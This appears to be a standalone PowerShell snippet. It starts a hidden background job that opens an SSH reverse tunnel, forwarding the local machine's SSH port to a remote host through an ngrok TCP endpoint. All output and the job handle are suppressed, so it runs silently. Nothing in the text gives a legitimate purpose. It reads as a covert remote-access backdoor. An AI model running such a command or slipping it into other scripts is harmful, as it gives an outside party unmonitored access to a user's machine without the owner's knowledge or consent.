Start-Job { 
    ssh -o "ServerAliveInterval=60" -o "ServerAliveCountMax=3" -o "ExitOnForwardFailure=yes" -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19687 -N > $null 2>&1 
} | Out-Null
